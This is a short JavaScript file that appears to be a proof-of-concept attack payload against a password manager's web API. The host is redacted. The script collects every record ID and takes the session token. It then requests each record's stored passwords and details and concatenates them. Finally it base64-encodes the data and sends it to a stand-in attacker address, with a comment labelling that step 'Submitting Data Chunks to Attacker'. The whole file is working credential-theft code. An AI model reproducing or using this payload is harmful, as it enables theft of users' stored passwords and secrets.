//hello

var data_chunks = '';
// Capturing Records from API
fetch('https://redacted.com/api/v3/records/all').then((resp) => resp.text()).then(function(data) {
    
    // Holds the records in as String
    var allrecords = data; 
    
    // converting response to JSON
    json_allrecords = JSON.parse(allrecords)['records'];

    // holds record Ids
	var record_ids  = new Array(); 
	Object.entries(json_allrecords).forEach(function(obj) {
	    record_ids.push((obj['1']['0']['id']));
	});

	// Capturing Session Token / Used to send POST requests
	fetch('https://redacted.com/api/v1/session/token').then((resp) => resp.text()).then(function(data1) {

		// Holds Session Token
		var session_token = JSON.parse(data1)['session_token'];

		data_chunks  = ""; // Will hold a complete record
		
		//Put loop for itterating through IDS
		record_ids.forEach(function(record_id) {
			    // Looping through IDs and grabing Passwords
				var grab_password = new XMLHttpRequest(); 
				grab_password.open('POST', 'https://redacted.com/api/v1/passwords/record', true);
				grab_password.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				grab_password.setRequestHeader("token", session_token);
				
				grab_password.onload = function () {   
					response_password = this.responseText;
					parsed_passwords = JSON.parse(response_password);
					// Sending data chunks
					data_chunks += parsed_passwords['record']['description']
					data_chunks += "\n"+parsed_passwords['record']['details']['0']['value']
					data_chunks += "\n"+parsed_passwords['record']['details']['1']['value']
					data_chunks += "\n"+parsed_passwords['record']['details']['2']['value']+"\n\n"
							};
				
				grab_password.send(JSON.stringify({id:record_id,is_organization:false}));
		});
		setTimeout(function(){ // Submitting Data Chunks to Attacker
     		fetch('http://127.0.0.1/?data='+btoa(data_chunks))
		}, 2000);


	});

}); 